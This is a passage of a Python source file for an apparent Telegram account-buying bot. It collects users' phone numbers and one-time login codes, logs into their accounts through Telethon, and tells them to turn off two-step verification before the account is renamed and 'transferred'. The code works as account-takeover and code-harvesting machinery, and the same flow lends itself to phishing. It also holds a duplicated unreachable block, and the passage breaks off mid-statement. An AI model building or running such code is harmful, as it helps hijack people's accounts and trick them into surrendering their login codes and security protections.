"""
Real Telegram Account Selling Handlers
Uses actual Telethon integration for real account operations
"""
import logging
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes, ConversationHandler, CallbackQueryHandler, MessageHandler, filters
from services.real_telegram import RealTelegramService
from handlers.form_handlers import handle_country_selection, handle_phone_number_input
from database import get_db_session, close_db_session
from database.operations import UserService, TelegramAccountService, SystemSettingsService
import json

logger = logging.getLogger(__name__)

# Conversation states
PHONE, WAITING_OTP, OTP_RECEIVED, DISABLE_2FA_WAIT, NAME_INPUT, PHOTO_INPUT, NEW_2FA_INPUT, FINAL_CONFIRM = range(8)

# Initialize real Telegram service
telegram_service = RealTelegramService()

async def show_real_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Real main menu - exact layout from image with real user data."""
    user = update.effective_user
    db = get_db_session()
    
    try:
        # Get real user data from database
        db_user = UserService.get_user_by_telegram_id(db, user.id)
        if not db_user:
            # Create user if not exists
            db_user = UserService.get_or_create_user(
                db=db,
                telegram_user_id=user.id,
                username=user.username,
                first_name=user.first_name,
                last_name=user.last_name,
                language_code=user.language_code or 'en'
            )
        
        # Get user's accounts
        accounts = TelegramAccountService.get_user_accounts(db, db_user.id)
        available_accounts = [acc for acc in accounts if acc.status.value == 'AVAILABLE']
        
    except Exception as e:
        logger.error(f"Error loading user data: {e}")
        # Use default values if database error
        class FallbackUser:
            balance = 0.0
            total_accounts_sold = 0
            total_earnings = 0.0
        db_user = FallbackUser()
        available_accounts = []
    finally:
        close_db_session(db)
    
    welcome_text = f"""
� **Telegram Account Selling Platform**

� **Welcome, Bujhlam Na Ki Holo!**

💼 **Your Statistics:**
• 📱 **Accounts Available:** {len(available_accounts)}
• 💰 **Balance:** ${db_user.balance:.2f}  
• 📊 **Total Sold:** {db_user.total_accounts_sold}
• 💎 **Total Earnings:** ${db_user.total_earnings:.2f}

🌍 **System Status:** 🟢 **Normal Load**
📈 **Your Status:** ✅ **ACTIVE**
    """
    
    # Create the EXACT layout from the image - 2x2 grid for main buttons
    keyboard = [
        # First row - LFG and Account Details  
        [
            InlineKeyboardButton("🚀 LFG (Sell)", callback_data="start_real_selling"),
            InlineKeyboardButton("📋 Account Details", callback_data="account_details")
        ],
        # Second row - Balance and Withdraw
        [
            InlineKeyboardButton("💰 Balance", callback_data="check_balance"), 
            InlineKeyboardButton("💸 Withdraw", callback_data="withdraw_menu")
        ],
        # Third row - Language and System Capacity
        [
            InlineKeyboardButton("🌍 Language", callback_data="language_menu"),
            InlineKeyboardButton("📊 System Capacity", callback_data="system_capacity")
        ],
        # Fourth row - Status and Support (full width)
        [
            InlineKeyboardButton("� Status", callback_data="status"),
            InlineKeyboardButton("🆘 Support", url="https://t.me/BujhlamNaKiHolo")
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)
    else:
        await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)

async def start_real_selling(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start real selling process - recreating exact layout from image."""
    
    sell_text = """
🚀 **Real Telegram Account Selling**

**💰 Sell Your Telegram Account - 100% Real Process!**

⚠️ **This is REAL - not a simulation!**

**What we do:**
• Send **real OTP** to your phone via Telegram
• **Actually login** to your account  
• **Really modify** account settings
• **Actually transfer** ownership
• **Real payment** processing

**Ready to sell your account?**

**Please type your phone number with country code:**
**Format:** +1234567890
**Example:** +919876543210
    """
    
    # Create the EXACT layout from the image - 2x2 grid for main buttons
    keyboard = [
        # First row - LFG and Account Details  
        [
            InlineKeyboardButton("🚀 LFG (Sell)", callback_data="start_real_selling"),
            InlineKeyboardButton("📋 Account Details", callback_data="account_details")
        ],
        # Second row - Balance and Withdraw
        [
            InlineKeyboardButton("💰 Balance", callback_data="check_balance"), 
            InlineKeyboardButton("💸 Withdraw", callback_data="withdraw_menu")
        ],
        # Third row - Language and System Capacity
        [
            InlineKeyboardButton("� Language", callback_data="language_menu"),
            InlineKeyboardButton("📊 System Capacity", callback_data="system_capacity")
        ],
        # Fourth row - Status and Support (full width)
        [
            InlineKeyboardButton("📱 Status", callback_data="user_status"),
            InlineKeyboardButton("🆘 Support", url="https://t.me/BujhlamNaKiHolo")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(sell_text, parse_mode='Markdown', reply_markup=reply_markup)
    return PHONE

async def handle_real_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle phone number input via text message."""
    phone = update.message.text.strip()
    
    # Validate phone format
    if not phone.startswith('+') or len(phone) < 8:
        await update.message.reply_text(
            "❌ **Invalid Format!**\n\nPlease include country code: `+1234567890`",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
            ])
        )
        return PHONE
    
    # Store phone and send OTP
    context.user_data['phone'] = phone
    
    # Send OTP directly
    processing_msg = await update.message.reply_text(
        f"📡 **Sending Real OTP to {phone}**\n\n⏳ Connecting to Telegram API...",
        parse_mode='Markdown'
    )
    
    try:
        logger.info(f"Attempting to send OTP to {phone}")
        result = await telegram_service.send_verification_code(phone)
        logger.info(f"OTP send result: {result}")
        
        if result['success']:
            context.user_data['phone_code_hash'] = result['phone_code_hash']
            context.user_data['session_key'] = result['session_key']
            
            # Show OTP input message
            otp_text = f"""
✅ **Real OTP Code Sent!**

📱 **Phone:** `{phone}`
📨 **Status:** Verification code sent via Telegram API
⏰ **Code Type:** {result.get('code_type', 'SMS')}

**Now type the 5-digit code you received:**
**Example:** 12345
            """
            
            keyboard = [
                [InlineKeyboardButton("🔄 Resend Code", callback_data="resend_otp")],
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ]
            
            await processing_msg.edit_text(
                otp_text, 
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return WAITING_OTP
            
        else:
            error_msg = result['message']
            keyboard = [
                [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ]
            
            await processing_msg.edit_text(
                f"❌ **Error:** {error_msg}",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationHandler.END
            
    except Exception as e:
        logger.error(f"Error in phone entry: {e}")
        await processing_msg.edit_text(
            f"❌ **Error:** {str(e)}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    
    # Show processing message
    processing_msg = await update.message.reply_text(
        "📡 **Connecting to Telegram API...**\n\n⏳ Sending real verification code...",
        parse_mode='Markdown'
    )
    
    # Send real OTP via Telethon
    try:
        result = await telegram_service.send_verification_code(phone)
        
        if result['success']:
            # Store session info
            context.user_data['phone_code_hash'] = result['phone_code_hash']
            context.user_data['session_key'] = result['session_key']
            
            success_text = f"""
✅ **Real OTP Code Sent!**

📱 **Phone:** `{phone}`
📨 **Status:** Verification code sent via Telegram API
⏰ **Code Type:** {result.get('code_type', 'SMS')}

**Check your Telegram app or SMS for the 5-digit code!**

Please enter the code you received:
            """
            
            await processing_msg.edit_text(success_text, parse_mode='Markdown')
            return WAITING_OTP
            
        else:
            # Handle errors
            error_msg = result['message']
            if result['error'] == 'flood_wait':
                error_text = f"""
⏳ **Rate Limited**

Too many requests. Please wait **{result['wait_time']} seconds** before trying again.

This is a Telegram API limitation for security.
                """
            elif result['error'] == 'invalid_phone':
                error_text = "❌ **Invalid Phone Number**\n\nPlease check your phone number format and try again."
            else:
                error_text = f"❌ **Error:** {error_msg}"
            
            keyboard = [
                [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ]
            
            await processing_msg.edit_text(
                error_text, 
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationHandler.END
            
    except Exception as e:
        logger.error(f"Error sending real OTP: {e}")
        await processing_msg.edit_text(
            f"❌ **System Error**\n\nError: {str(e)}\n\nPlease try again later.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← Back", callback_data="main_menu")]])
        )
        return ConversationHandler.END

async def confirm_send_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Confirm and send real OTP via form system."""
    query = update.callback_query
    await query.answer()
    
    phone = context.user_data.get('phone')
    if not phone:
        await query.edit_message_text(
            "❌ **Error:** No phone number found. Please restart.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Restart", callback_data="start_real_selling")]])
        )
        return ConversationHandler.END
    
    # Show processing message
    await query.edit_message_text(
        "📡 **Connecting to Telegram API...**\n\n⏳ Sending real verification code...",
        parse_mode='Markdown'
    )
    
    # Send real OTP via Telethon
    try:
        result = await telegram_service.send_verification_code(phone)
        
        if result['success']:
            # Store session info
            context.user_data['phone_code_hash'] = result['phone_code_hash']
            context.user_data['session_key'] = result['session_key']
            
            success_text = f"""
✅ **Real OTP Code Sent!**

📱 **Phone:** `{phone}`
📨 **Status:** Verification code sent via Telegram API
⏰ **Code Type:** {result.get('code_type', 'SMS')}

**Check your Telegram app or SMS for the 5-digit code!**

Please enter the code you received:
            """
            
            await query.edit_message_text(success_text, parse_mode='Markdown')
            return WAITING_OTP
            
        else:
            # Handle errors
            error_msg = result['message']
            if result['error'] == 'flood_wait':
                error_text = f"""
⏳ **Rate Limited**

Too many requests. Please wait **{result['wait_time']} seconds** before trying again.

This is a Telegram API limitation for security.
                """
            elif result['error'] == 'invalid_phone':
                error_text = "❌ **Invalid Phone Number**\n\nPlease check your phone number format and try again."
            else:
                error_text = f"❌ **Error:** {error_msg}"
            
            keyboard = [
                [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ]
            
            await query.edit_message_text(
                error_text, 
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationHandler.END
            
    except Exception as e:
        logger.error(f"Error sending real OTP: {e}")
        await query.edit_message_text(
            f"❌ **System Error**\n\nError: {str(e)}\n\nPlease try again later.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← Back", callback_data="main_menu")]])
        )
        return ConversationHandler.END

async def handle_country_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle country selection via inline callbacks."""
    query = update.callback_query
    await query.answer()
    
    callback_data = query.data
    
    if callback_data == "more_countries":
        # Show additional countries
        more_text = """
📱 **Select Your Country**

**More Countries Available:**
        """
        
        keyboard = [
            [InlineKeyboardButton("🇫🇷 France (+33)", callback_data="country_+33_FR")],
            [InlineKeyboardButton("🇷🇺 Russia (+7)", callback_data="country_+7_RU")],
            [InlineKeyboardButton("🇧🇷 Brazil (+55)", callback_data="country_+55_BR")],
            [InlineKeyboardButton("🇯🇵 Japan (+81)", callback_data="country_+81_JP")],
            [InlineKeyboardButton("🇨🇳 China (+86)", callback_data="country_+86_CN")],
            [InlineKeyboardButton("🇰🇷 South Korea (+82)", callback_data="country_+82_KR")],
            [InlineKeyboardButton("📝 Manual Entry", callback_data="country_manual")],
            [InlineKeyboardButton("🔙 Back", callback_data="start_real_selling")]
        ]
        
        await query.edit_message_text(more_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
        return PHONE
        
    elif callback_data.startswith("country_"):
        # Extract country code and name
        parts = callback_data.split("_")
        if len(parts) >= 3:
            country_code = parts[1]
            country_name = parts[2]
            
            # Store country selection
            context.user_data['country_code'] = country_code
            context.user_data['country_name'] = country_name
            context.user_data['phone_digits'] = ""
            
            # Show phone input interface
            return await show_phone_input_interface(query, context, country_code, country_name)
        
    elif callback_data == "country_manual":
        # Manual phone entry
        manual_text = """
📱 **Manual Phone Entry**

Since you selected manual entry, please **type your complete phone number** including country code:

**Format:** +1234567890
**Example:** +919876543210

**⚠️ After typing, we'll send REAL OTP!**
        """
        
        keyboard = [
            [InlineKeyboardButton("🔙 Select Country", callback_data="start_real_selling")],
            [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
        ]
        
        context.user_data['manual_entry'] = True
        await query.edit_message_text(manual_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
        return PHONE

async def show_phone_input_interface(query, context: ContextTypes.DEFAULT_TYPE, country_code: str, country_name: str) -> int:
    """Show interactive phone number input interface."""
    current_digits = context.user_data.get('phone_digits', "")
    
    input_text = f"""
📱 **Phone Number Input**

**Country:** {country_name} ({country_code})
**Current Number:** `{country_code}{current_digits}_`

**Enter your phone number using the keypad below:**
    """
    
    # Create numeric keypad
    keyboard = []
    
    # Number rows (3x3 grid)
    for row in [[1, 2, 3], [4, 5, 6], [7, 8, 9]]:
        keyboard.append([InlineKeyboardButton(str(num), callback_data=f"digit_{num}") for num in row])
    
    # Bottom row with 0 and controls
    keyboard.append([
        InlineKeyboardButton("⬅️", callback_data="backspace"),
        InlineKeyboardButton("0", callback_data="digit_0"),
        InlineKeyboardButton("✅", callback_data="confirm_phone")
    ])
    
    # Action buttons
    keyboard.append([
        InlineKeyboardButton("🔙 Change Country", callback_data="start_real_selling"),
        InlineKeyboardButton("❌ Cancel", callback_data="main_menu")
    ])
    
    await query.edit_message_text(input_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
    return PHONE

async def handle_phone_digit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle digit input for phone number."""
    query = update.callback_query
    await query.answer()
    
    callback_data = query.data
    current_digits = context.user_data.get('phone_digits', "")
    country_code = context.user_data.get('country_code', '+1')
    country_name = context.user_data.get('country_name', 'Selected')
    
    if callback_data.startswith("digit_"):
        # Add digit
        digit = callback_data.split("_")[1]
        if len(current_digits) < 15:  # Limit phone number length
            current_digits += digit
            context.user_data['phone_digits'] = current_digits
        
        # Update interface
        return await show_phone_input_interface(query, context, country_code, country_name)
        
    elif callback_data == "backspace":
        # Remove last digit
        if current_digits:
            current_digits = current_digits[:-1]
            context.user_data['phone_digits'] = current_digits
        
        # Update interface
        return await show_phone_input_interface(query, context, country_code, country_name)
        
    elif callback_data == "confirm_phone":
        # Validate and confirm phone number
        if len(current_digits) < 6:
            await query.answer("❌ Phone number too short! Add more digits.", show_alert=True)
            return PHONE
        
        full_phone = country_code + current_digits
        context.user_data['phone'] = full_phone
        
        # Show confirmation and send OTP
        return await send_real_otp_inline(query, context, full_phone)

async def send_real_otp_inline(query, context: ContextTypes.DEFAULT_TYPE, phone: str) -> int:
    """Send real OTP and show confirmation via inline interface."""
    
    # Show processing message
    processing_text = f"""
📡 **Sending Real OTP Code**

**Phone:** `{phone}`
**Status:** Connecting to Telegram API...

⏳ Please wait while we send the verification code...
    """
    
    await query.edit_message_text(processing_text, parse_mode='Markdown')
    
    try:
        result = await telegram_service.send_verification_code(phone)
        
        if result['success']:
            # Store session info
            context.user_data['phone_code_hash'] = result['phone_code_hash']
            context.user_data['session_key'] = result['session_key']
            context.user_data['otp_digits'] = ""
            
            # Show OTP input interface
            return await show_otp_input_interface(query, context, phone)
            
        else:
            # Handle errors
            error_msg = result['message']
            if result['error'] == 'flood_wait':
                error_text = f"""
⏳ **Rate Limited**

Too many requests. Please wait **{result['wait_time']} seconds** before trying again.
                """
            else:
                error_text = f"❌ **Error:** {error_msg}"
            
            keyboard = [
                [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ]
            
            await query.edit_message_text(
                error_text, 
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationHandler.END
            
    except Exception as e:
        logger.error(f"Error sending real OTP via inline: {e}")
        await query.edit_message_text(
            f"❌ **System Error**\n\nError: {str(e)}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def show_otp_input_interface(query, context: ContextTypes.DEFAULT_TYPE, phone: str) -> int:
    """Show interactive OTP input interface."""
    current_otp = context.user_data.get('otp_digits', "")
    otp_display = current_otp + "_" * (5 - len(current_otp))
    
    otp_text = f"""
🔐 **OTP Verification**

**Phone:** `{phone}`
**Code:** `{otp_display[0]} {otp_display[1]} {otp_display[2]} {otp_display[3]} {otp_display[4]}`

✅ **OTP Code Sent Successfully!**

Enter the 5-digit code using the keypad below:
    """
    
    # Create numeric keypad for OTP
    keyboard = []
    
    # Number rows (3x3 grid)
    for row in [[1, 2, 3], [4, 5, 6], [7, 8, 9]]:
        keyboard.append([InlineKeyboardButton(str(num), callback_data=f"otp_{num}") for num in row])
    
    # Bottom row with 0 and controls
    keyboard.append([
        InlineKeyboardButton("⬅️", callback_data="otp_backspace"),
        InlineKeyboardButton("0", callback_data="otp_0"),
        InlineKeyboardButton("✅", callback_data="verify_otp")
    ])
    
    # Action buttons
    keyboard.append([
        InlineKeyboardButton("🔄 Resend Code", callback_data="resend_otp"),
        InlineKeyboardButton("❌ Cancel", callback_data="main_menu")
    ])
    
    await query.edit_message_text(otp_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
    return WAITING_OTP

async def handle_otp_digit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle OTP digit input."""
    query = update.callback_query
    await query.answer()
    
    callback_data = query.data
    current_otp = context.user_data.get('otp_digits', "")
    phone = context.user_data.get('phone', '')
    
    if callback_data.startswith("otp_"):
        # Add OTP digit
        digit = callback_data.split("_")[1]
        if len(current_otp) < 5:
            current_otp += digit
            context.user_data['otp_digits'] = current_otp
        
        # Auto-submit if 5 digits entered
        if len(current_otp) == 5:
            return await verify_otp_inline(query, context, current_otp)
        
        # Update interface
        return await show_otp_input_interface(query, context, phone)
        
    elif callback_data == "otp_backspace":
        # Remove last digit
        if current_otp:
            current_otp = current_otp[:-1]
            context.user_data['otp_digits'] = current_otp
        
        # Update interface
        return await show_otp_input_interface(query, context, phone)
        
    elif callback_data == "verify_otp":
        # Manual verification
        if len(current_otp) != 5:
            await query.answer("❌ Please enter all 5 digits!", show_alert=True)
            return WAITING_OTP
        
        return await verify_otp_inline(query, context, current_otp)
        
    elif callback_data == "resend_otp":
        # Resend OTP
        return await send_real_otp_inline(query, context, phone)

async def verify_otp_inline(query, context: ContextTypes.DEFAULT_TYPE, otp: str) -> int:
    """Verify OTP code via inline interface."""
    phone = context.user_data.get('phone')
    session_key = context.user_data.get('session_key')
    phone_code_hash = context.user_data.get('phone_code_hash')
    
    # Show processing message
    await query.edit_message_text(
        "🔐 **Verifying OTP Code...**\n\n⏳ Checking with Telegram API...",
        parse_mode='Markdown'
    )
    
    try:
        result = await telegram_service.verify_code_and_login(
            session_key, phone, phone_code_hash, otp
        )
        
        if result['success']:
            # Successfully logged in!
            user_info = result['user_info']
            context.user_data['user_info'] = user_info
            
            success_text = f"""
🎉 **Successfully Logged In via Inline Form!**

**✅ Account Verified:**
• **Name:** {user_info['first_name']} {user_info.get('last_name', '')}
• **Username:** @{user_info['username'] or 'None'}
• **Phone:** {user_info['phone']}
• **Premium:** {'✅ Yes' if user_info.get('is_premium') else '❌ No'}

**🔍 2FA Status:** {'✅ Enabled' if result.get('has_2fa') else '❌ Disabled'}

Ready to proceed with account configuration?
            """
            
            keyboard = [
                [InlineKeyboardButton("✅ Continue Setup", callback_data="continue_setup")],
                [InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale")]
            ]
            
            await query.edit_message_text(
                success_text, 
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return OTP_RECEIVED
            
        else:
            error_text = f"❌ **Invalid OTP Code**\n\n{result['message']}\n\nPlease try again."
            keyboard = [
                [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")]
            ]
            
            await query.edit_message_text(
                error_text,
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationHandler.END
            
    except Exception as e:
        logger.error(f"Error verifying OTP via inline: {e}")
        await query.edit_message_text(
            f"❌ **Verification Error**\n\nError: {str(e)}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle data from WebApp embedded forms."""
    try:
        # Parse WebApp data
        webapp_data = json.loads(update.effective_message.web_app_data.data)
        action = webapp_data.get('action')
        
        if action == 'phone_submitted':
            # Handle phone submission from embedded form
            phone = webapp_data.get('phone')
            context.user_data['phone'] = phone
            
            # Send real OTP using the embedded form data
            processing_msg = await update.effective_message.reply_text(
                "📡 **Processing Phone Number from Embedded Form...**\n\n⏳ Sending real verification code...",
                parse_mode='Markdown'
            )
            
            try:
                result = await telegram_service.send_verification_code(phone)
                
                if result['success']:
                    # Store session info
                    context.user_data['phone_code_hash'] = result['phone_code_hash']
                    context.user_data['session_key'] = result['session_key']
                    
                    # Show OTP WebApp form
                    from webapp.server import get_webapp_urls
                    from telegram import WebAppInfo
                    urls = get_webapp_urls()
                    
                    success_text = f"""
✅ **Real OTP Code Sent!**

📱 **Phone:** `{phone}`
📨 **Status:** Verification code sent via Telegram API
⏰ **Code Type:** {result.get('code_type', 'SMS')}

**Now open the embedded OTP form below:**
                    """
                    
                    keyboard = [
                        [InlineKeyboardButton("🔐 Open OTP Form", web_app=WebAppInfo(url=urls['otp'](phone)))],
                        [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")]
                    ]
                    
                    await processing_msg.edit_text(
                        success_text, 
                        parse_mode='Markdown',
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                    return WAITING_OTP
                    
                else:
                    # Handle errors
                    error_msg = result['message']
                    if result['error'] == 'flood_wait':
                        error_text = f"""
❌ **Rate Limited**

Too many requests. Please wait **{result['wait_time']} seconds** before trying again.
                        """
                    else:
                        error_text = f"❌ **Error:** {error_msg}"
                    
                    keyboard = [
                        [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
                        [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
                    ]
                    
                    await processing_msg.edit_text(
                        error_text, 
                        parse_mode='Markdown',
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                    return ConversationHandler.END
                    
            except Exception as e:
                logger.error(f"Error sending real OTP from WebApp: {e}")
                await processing_msg.edit_text(
                    f"❌ **System Error**\n\nError: {str(e)}\n\nPlease try again later.",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
        
        elif action == 'otp_submitted':
            # Handle OTP submission from embedded form
            otp = webapp_data.get('otp')
            phone = context.user_data.get('phone')
            session_key = context.user_data.get('session_key')
            phone_code_hash = context.user_data.get('phone_code_hash')
            
            if not all([otp, phone, session_key, phone_code_hash]):
                await update.effective_message.reply_text("❌ **Error:** Missing verification data. Please restart.")
                return ConversationHandler.END
            
            # Verify OTP using embedded form data
            processing_msg = await update.effective_message.reply_text(
                "🔐 **Verifying OTP Code from Embedded Form...**\n\n⏳ Checking with Telegram API...",
                parse_mode='Markdown'
            )
            
            try:
                result = await telegram_service.verify_code_and_login(
                    session_key, phone, phone_code_hash, otp
                )
                
                if result['success']:
                    # Successfully logged in!
                    user_info = result['user_info']
                    context.user_data['user_info'] = user_info
                    
                    success_text = f"""
🎉 **Successfully Logged In via Embedded Form!**

**✅ Account Verified:**
• **Name:** {user_info['first_name']} {user_info.get('last_name', '')}
• **Username:** @{user_info['username'] or 'None'}
• **Phone:** {user_info['phone']}
• **Premium:** {'✅ Yes' if user_info.get('is_premium') else '❌ No'}

**🔍 2FA Status:** {'✅ Enabled' if result.get('has_2fa') else '❌ Disabled'}

Ready to proceed with account configuration?
                    """
                    
                    keyboard = [
                        [InlineKeyboardButton("✅ Continue Setup", callback_data="continue_setup")],
                        [InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale")]
                    ]
                    
                    await processing_msg.edit_text(
                        success_text, 
                        parse_mode='Markdown',
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                    return OTP_RECEIVED
                    
                else:
                    error_text = f"❌ **Invalid OTP Code**\n\n{result['message']}\n\nPlease try again."
                    keyboard = [
                        [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")]
                    ]
                    
                    await processing_msg.edit_text(
                        error_text,
                        parse_mode='Markdown',
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                    return ConversationHandler.END
                    
            except Exception as e:
                logger.error(f"Error verifying OTP from WebApp: {e}")
                await processing_msg.edit_text(
                    f"❌ **Verification Error**\n\nError: {str(e)}",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
        
        elif action == 'resend_otp':
            # Handle OTP resend request from embedded form
            phone = webapp_data.get('phone')
            
            processing_msg = await update.effective_message.reply_text(
                "📲 **Resending OTP Code...**\n\n⏳ Please wait...",
                parse_mode='Markdown'
            )
            
            try:
                result = await telegram_service.send_verification_code(phone)
                
                if result['success']:
                    context.user_data['phone_code_hash'] = result['phone_code_hash']
                    context.user_data['session_key'] = result['session_key']
                    
                    await processing_msg.edit_text(
                        "✅ **OTP Code Resent!**\n\nCheck your phone for the new verification code.",
                        parse_mode='Markdown'
                    )
                else:
                    await processing_msg.edit_text(
                        f"❌ **Resend Failed:** {result['message']}",
                        parse_mode='Markdown'
                    )
                    
            except Exception as e:
                logger.error(f"Error resending OTP: {e}")
                await processing_msg.edit_text(
                    f"❌ **Resend Error:** {str(e)}",
                    parse_mode='Markdown'
                )
            
            return WAITING_OTP
    
    except Exception as e:
        logger.error(f"Error handling WebApp data: {e}")
        await update.effective_message.reply_text(
            "❌ **WebApp Error**\n\nPlease try again.",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def handle_real_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle real OTP verification."""
    code = update.message.text.strip()
    
    # Validate code format
    if not code.isdigit() or len(code) != 5:
        await update.message.reply_text(
            "❌ Invalid code format. Please enter the 5-digit code:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]])
        )
        return WAITING_OTP
    
    # Show verification message
    verify_msg = await update.message.reply_text(
        "🔐 **Verifying code with Telegram API...**\n\n⏳ Please wait...",
        parse_mode='Markdown'
    )
    
    # Verify with real Telegram API
    try:
        session_key = context.user_data['session_key']
        phone = context.user_data['phone']
        phone_code_hash = context.user_data['phone_code_hash']
        
        result = await telegram_service.verify_code_and_login(
            session_key, phone, phone_code_hash, code
        )
        
        if result['success']:
            # Successfully logged in!
            user_info = result['user_info']
            context.user_data['user_info'] = user_info
            
            success_text = f"""
🎉 **Successfully Logged In!**

**✅ Account Verified:**
• **Name:** {user_info['first_name']} {user_info.get('last_name', '')}
• **Username:** @{user_info['username'] or 'None'}
• **Phone:** {user_info['phone']}
• **Premium:** {'✅ Yes' if user_info.get('is_premium') else '❌ No'}

**🔍 2FA Status:** {'✅ Enabled' if result.get('has_2fa') else '❌ Disabled'}

Ready to proceed with account configuration?
            """
            
            keyboard = [
                [InlineKeyboardButton("✅ Continue Setup", callback_data="continue_setup")],
                [InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale")]
            ]
            
            await verify_msg.edit_text(
                success_text, 
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return OTP_RECEIVED
            
        elif result['error'] == '2fa_required':
            # 2FA is enabled - need to disable first
            twofa_text = f"""
🔐 **2FA Detected!**

Your account has **Two-Factor Authentication** enabled.

**⚠️ You must DISABLE 2FA before selling:**

1. Open Telegram app
2. Go to **Settings** → **Privacy & Security**  
3. Select **Two-Step Verification**
4. **Turn OFF** Two-Step Verification
5. Enter your current 2FA password to confirm

**Once disabled, click "2FA Disabled" below:**
            """
            
            keyboard = [
                [InlineKeyboardButton("✅ I Disabled 2FA", callback_data="2fa_disabled")],
                [InlineKeyboardButton("❓ Help with 2FA", callback_data="2fa_help")],
                [InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale")]
            ]
            
            await verify_msg.edit_text(
                twofa_text,
                parse_mode='Markdown', 
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return DISABLE_2FA_WAIT
            
        else:
            # Handle verification errors
            error_msg = result['message']
            if result['error'] == 'invalid_code':
                error_text = "❌ **Invalid Code**\n\nPlease check the code and try again:"
                await verify_msg.edit_text(error_text, parse_mode='Markdown')
                return WAITING_OTP
            elif result['error'] == 'code_expired':
                error_text = "⏰ **Code Expired**\n\nPlease request a new verification code."
            else:
                error_text = f"❌ **Error:** {error_msg}"
            
            keyboard = [
                [InlineKeyboardButton("🔄 New Code", callback_data="start_real_selling")],
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ]
            
            await verify_msg.edit_text(
                error_text,
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationHandler.END
            
    except Exception as e:
        logger.error(f"Error verifying real OTP: {e}")
        await verify_msg.edit_text(
            f"❌ **Verification Error**\n\nError: {str(e)}\n\nPlease try again.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← Back", callback_data="main_menu")]])
        )
        return ConversationHandler.END

async def handle_continue_setup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Continue to account setup after successful login."""
    await update.callback_query.answer("✅ Proceeding to setup!")
    
    name_text = """
👤 **Step 2: Account Name Setup**

Enter the **new name** for this account:

**Current Name:** {current_name}

**Examples:**
• John Smith
• Sarah Wilson  
• Mike Johnson

**Enter new name:**
    """.format(
